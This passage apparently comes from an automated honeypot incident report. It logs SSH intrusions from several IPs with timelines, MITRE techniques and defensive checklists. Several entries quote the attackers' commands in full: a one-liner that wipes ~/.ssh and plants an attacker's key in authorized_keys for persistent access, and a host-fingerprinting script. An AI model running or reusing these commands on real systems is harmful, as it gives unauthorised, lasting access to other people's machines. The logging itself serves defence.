| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:14:31` | `cowrie.session.connect` |
| `2026-09-03 10:14:31` | `cowrie.client.version` |
| `2026-09-03 10:14:31` | `cowrie.client.kex` |
| `2026-09-03 10:14:32` | `cowrie.login.success` |
| `2026-09-03 10:14:32` | `cowrie.direct-tcpip.request` |
| `2026-09-03 10:14:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 10:14:32` | `cowrie.direct-tcpip.data` |
| `2026-09-03 10:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06f5c7e7b0f8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 10:15 |
| **Last Seen** | 2026-09-03 10:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:15:43` | `cowrie.session.connect` |
| `2026-09-03 10:15:43` | `cowrie.client.version` |
| `2026-09-03 10:15:43` | `cowrie.client.kex` |
| `2026-09-03 10:15:44` | `cowrie.login.success` |
| `2026-09-03 10:15:44` | `cowrie.direct-tcpip.request` |
| `2026-09-03 10:15:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 10:15:44` | `cowrie.direct-tcpip.data` |
| `2026-09-03 10:15:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb416f1fcdf3

| Field | Detail |
|---|---|
| **Source IP** | `165.154.23[.]187` |
| **First Seen** | 2026-09-03 10:22 |
| **Last Seen** | 2026-09-03 10:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:22:44` | `cowrie.session.connect` |
| `2026-09-03 10:22:44` | `cowrie.client.version` |
| `2026-09-03 10:22:45` | `cowrie.client.kex` |
| `2026-09-03 10:22:45` | `cowrie.login.success` |
| `2026-09-03 10:22:47` | `cowrie.session.params` |
| `2026-09-03 10:22:47` | `cowrie.command.input` |
| `2026-09-03 10:22:47` | `cowrie.command.failed` |
| `2026-09-03 10:22:47` | `cowrie.log.closed` |
| `2026-09-03 10:22:48` | `cowrie.session.params` |
| `2026-09-03 10:22:48` | `cowrie.command.input` |
| `2026-09-03 10:22:48` | `cowrie.session.file_download` |
| `2026-09-03 10:22:48` | `cowrie.log.closed` |
| `2026-09-03 10:22:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.23[.]187` to AbuseIPDB if not already reported
- [ ] Block `165.154.23[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e25a638a59e1

| Field | Detail |
|---|---|
| **Source IP** | `165.154.23[.]187` |
| **First Seen** | 2026-09-03 10:22 |
| **Last Seen** | 2026-09-03 10:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:22:48` | `cowrie.session.connect` |
| `2026-09-03 10:22:48` | `cowrie.client.version` |
| `2026-09-03 10:22:49` | `cowrie.client.kex` |
| `2026-09-03 10:22:50` | `cowrie.login.success` |
| `2026-09-03 10:22:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.23[.]187` to AbuseIPDB if not already reported
- [ ] Block `165.154.23[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd8f2d3bbfaa

| Field | Detail |
|---|---|
| **Source IP** | `165.154.23[.]187` |
| **First Seen** | 2026-09-03 10:22 |
| **Last Seen** | 2026-09-03 10:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:22:50` | `cowrie.session.connect` |
| `2026-09-03 10:22:50` | `cowrie.client.version` |
| `2026-09-03 10:22:50` | `cowrie.client.kex` |
| `2026-09-03 10:22:51` | `cowrie.login.success` |
| `2026-09-03 10:22:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.23[.]187` to AbuseIPDB if not already reported
- [ ] Block `165.154.23[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc68530fe731

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 10:25 |
| **Last Seen** | 2026-09-03 10:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:25:06` | `cowrie.session.connect` |
| `2026-09-03 10:25:06` | `cowrie.client.version` |
| `2026-09-03 10:25:06` | `cowrie.client.kex` |
| `2026-09-03 10:25:07` | `cowrie.login.success` |
| `2026-09-03 10:25:07` | `cowrie.direct-tcpip.request` |
| `2026-09-03 10:25:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 10:25:08` | `cowrie.direct-tcpip.data` |
| `2026-09-03 10:25:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4d98d68b8a6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 10:25 |
| **Last Seen** | 2026-09-03 10:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:25:08` | `cowrie.session.connect` |
| `2026-09-03 10:25:08` | `cowrie.client.version` |
| `2026-09-03 10:25:08` | `cowrie.client.kex` |
| `2026-09-03 10:25:09` | `cowrie.login.success` |
| `2026-09-03 10:25:09` | `cowrie.direct-tcpip.request` |
| `2026-09-03 10:25:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 10:25:09` | `cowrie.direct-tcpip.data` |
| `2026-09-03 10:25:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bed9cb89c709

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:25 |
| **Last Seen** | 2026-09-03 10:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:25:20` | `cowrie.session.connect` |
| `2026-09-03 10:25:21` | `cowrie.client.version` |
| `2026-09-03 10:25:21` | `cowrie.client.kex` |
| `2026-09-03 10:25:23` | `cowrie.login.success` |
| `2026-09-03 10:25:25` | `cowrie.session.params` |
| `2026-09-03 10:25:25` | `cowrie.command.input` |
| `2026-09-03 10:25:25` | `cowrie.command.input` |
| `2026-09-03 10:25:25` | `cowrie.command.input` |
| `2026-09-03 10:25:25` | `cowrie.command.input` |
| `2026-09-03 10:25:25` | `cowrie.command.input` |
| `2026-09-03 10:25:25` | `cowrie.command.success` |
| `2026-09-03 10:25:25` | `cowrie.command.input` |
| `2026-09-03 10:25:25` | `cowrie.command.input` |
| `2026-09-03 10:25:25` | `cowrie.command.input` |
| `2026-09-03 10:25:25` | `cowrie.command.input` |
| `2026-09-03 10:25:26` | `cowrie.log.closed` |
| `2026-09-03 10:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f156275db44

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:26 |
| **Last Seen** | 2026-09-03 10:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:26:33` | `cowrie.session.connect` |
| `2026-09-03 10:26:33` | `cowrie.client.version` |
| `2026-09-03 10:26:33` | `cowrie.client.kex` |
| `2026-09-03 10:26:36` | `cowrie.login.success` |
| `2026-09-03 10:26:38` | `cowrie.session.params` |
| `2026-09-03 10:26:38` | `cowrie.command.input` |
| `2026-09-03 10:26:38` | `cowrie.command.input` |
| `2026-09-03 10:26:38` | `cowrie.command.input` |
| `2026-09-03 10:26:38` | `cowrie.command.input` |
| `2026-09-03 10:26:38` | `cowrie.command.input` |
| `2026-09-03 10:26:38` | `cowrie.command.success` |
| `2026-09-03 10:26:38` | `cowrie.command.input` |
| `2026-09-03 10:26:38` | `cowrie.command.input` |
| `2026-09-03 10:26:38` | `cowrie.command.input` |
| `2026-09-03 10:26:38` | `cowrie.command.input` |
| `2026-09-03 10:26:39` | `cowrie.log.closed` |
| `2026-09-03 10:26:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2405112a02d5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:27 |
| **Last Seen** | 2026-09-03 10:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:27:47` | `cowrie.session.connect` |
| `2026-09-03 10:27:47` | `cowrie.client.version` |
| `2026-09-03 10:27:47` | `cowrie.client.kex` |
| `2026-09-03 10:27:50` | `cowrie.login.success` |
| `2026-09-03 10:27:52` | `cowrie.session.params` |
| `2026-09-03 10:27:52` | `cowrie.command.input` |
| `2026-09-03 10:27:52` | `cowrie.command.input` |
| `2026-09-03 10:27:52` | `cowrie.command.input` |
| `2026-09-03 10:27:52` | `cowrie.command.input` |
| `2026-09-03 10:27:52` | `cowrie.command.input` |
| `2026-09-03 10:27:52` | `cowrie.command.success` |
| `2026-09-03 10:27:52` | `cowrie.command.input` |
| `2026-09-03 10:27:52` | `cowrie.command.input` |
| `2026-09-03 10:27:52` | `cowrie.command.input` |
| `2026-09-03 10:27:52` | `cowrie.command.input` |
| `2026-09-03 10:27:52` | `cowrie.log.closed` |
| `2026-09-03 10:27:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ccf6f868ed6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:29 |
| **Last Seen** | 2026-09-03 10:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:29:00` | `cowrie.session.connect` |
| `2026-09-03 10:29:00` | `cowrie.client.version` |
| `2026-09-03 10:29:00` | `cowrie.client.kex` |
| `2026-09-03 10:29:02` | `cowrie.login.success` |
| `2026-09-03 10:29:04` | `cowrie.session.params` |
| `2026-09-03 10:29:04` | `cowrie.command.input` |
| `2026-09-03 10:29:04` | `cowrie.command.input` |
| `2026-09-03 10:29:04` | `cowrie.command.input` |
| `2026-09-03 10:29:04` | `cowrie.command.input` |
| `2026-09-03 10:29:04` | `cowrie.command.input` |
| `2026-09-03 10:29:04` | `cowrie.command.success` |
| `2026-09-03 10:29:04` | `cowrie.command.input` |
| `2026-09-03 10:29:04` | `cowrie.command.input` |
| `2026-09-03 10:29:04` | `cowrie.command.input` |
| `2026-09-03 10:29:04` | `cowrie.command.input` |
| `2026-09-03 10:29:05` | `cowrie.log.closed` |
| `2026-09-03 10:29:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33d17542362b

| Field | Detail |
|---|---|
| **Source IP** | `112.151.168[.]124` |
| **First Seen** | 2026-09-03 10:30 |
| **Last Seen** | 2026-09-03 10:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:30:10` | `cowrie.session.connect` |
| `2026-09-03 10:30:10` | `cowrie.client.version` |
| `2026-09-03 10:30:11` | `cowrie.client.kex` |
| `2026-09-03 10:30:11` | `cowrie.login.success` |
| `2026-09-03 10:30:12` | `cowrie.session.params` |
| `2026-09-03 10:30:12` | `cowrie.command.input` |
| `2026-09-03 10:30:12` | `cowrie.command.failed` |
| `2026-09-03 10:30:13` | `cowrie.log.closed` |
| `2026-09-03 10:30:13` | `cowrie.session.params` |
| `2026-09-03 10:30:13` | `cowrie.command.input` |
| `2026-09-03 10:30:14` | `cowrie.session.file_download` |
| `2026-09-03 10:30:14` | `cowrie.log.closed` |
| `2026-09-03 10:30:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.168[.]124` to AbuseIPDB if not already reported
- [ ] Block `112.151.168[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff3e5650bfc0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:30 |
| **Last Seen** | 2026-09-03 10:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:30:11` | `cowrie.session.connect` |
| `2026-09-03 10:30:11` | `cowrie.client.version` |
| `2026-09-03 10:30:11` | `cowrie.client.kex` |
| `2026-09-03 10:30:14` | `cowrie.login.success` |
| `2026-09-03 10:30:16` | `cowrie.session.params` |
| `2026-09-03 10:30:16` | `cowrie.command.input` |
| `2026-09-03 10:30:16` | `cowrie.command.input` |
| `2026-09-03 10:30:16` | `cowrie.command.input` |
| `2026-09-03 10:30:16` | `cowrie.command.input` |
| `2026-09-03 10:30:16` | `cowrie.command.input` |
| `2026-09-03 10:30:16` | `cowrie.command.success` |
| `2026-09-03 10:30:16` | `cowrie.command.input` |
| `2026-09-03 10:30:16` | `cowrie.command.input` |
| `2026-09-03 10:30:16` | `cowrie.command.input` |
| `2026-09-03 10:30:16` | `cowrie.command.input` |
| `2026-09-03 10:30:16` | `cowrie.log.closed` |
| `2026-09-03 10:30:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbf10a81486c

| Field | Detail |
|---|---|
| **Source IP** | `112.151.168[.]124` |
| **First Seen** | 2026-09-03 10:30 |
| **Last Seen** | 2026-09-03 10:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:30:14` | `cowrie.session.connect` |
| `2026-09-03 10:30:14` | `cowrie.client.version` |
| `2026-09-03 10:30:14` | `cowrie.client.kex` |
| `2026-09-03 10:30:15` | `cowrie.login.success` |
| `2026-09-03 10:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.168[.]124` to AbuseIPDB if not already reported
- [ ] Block `112.151.168[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea5d851b2ee2

| Field | Detail |
|---|---|
| **Source IP** | `112.151.168[.]124` |
| **First Seen** | 2026-09-03 10:30 |
| **Last Seen** | 2026-09-03 10:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:30:16` | `cowrie.session.connect` |
| `2026-09-03 10:30:16` | `cowrie.client.version` |
| `2026-09-03 10:30:16` | `cowrie.client.kex` |
| `2026-09-03 10:30:17` | `cowrie.login.success` |
| `2026-09-03 10:30:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.168[.]124` to AbuseIPDB if not already reported
- [ ] Block `112.151.168[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-310e3abc6ace

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:31 |
| **Last Seen** | 2026-09-03 10:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:31:21` | `cowrie.session.connect` |
| `2026-09-03 10:31:22` | `cowrie.client.version` |
| `2026-09-03 10:31:22` | `cowrie.client.kex` |
| `2026-09-03 10:31:24` | `cowrie.login.success` |
| `2026-09-03 10:31:26` | `cowrie.session.params` |
| `2026-09-03 10:31:26` | `cowrie.command.input` |
| `2026-09-03 10:31:26` | `cowrie.command.input` |
| `2026-09-03 10:31:26` | `cowrie.command.input` |
| `2026-09-03 10:31:26` | `cowrie.command.input` |
| `2026-09-03 10:31:26` | `cowrie.command.input` |
| `2026-09-03 10:31:26` | `cowrie.command.success` |
| `2026-09-03 10:31:26` | `cowrie.command.input` |
| `2026-09-03 10:31:26` | `cowrie.command.input` |
| `2026-09-03 10:31:26` | `cowrie.command.input` |
| `2026-09-03 10:31:26` | `cowrie.command.input` |
| `2026-09-03 10:31:26` | `cowrie.log.closed` |
| `2026-09-03 10:31:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22dc5740a873

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-09-03 10:32 |
| **Last Seen** | 2026-09-03 10:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
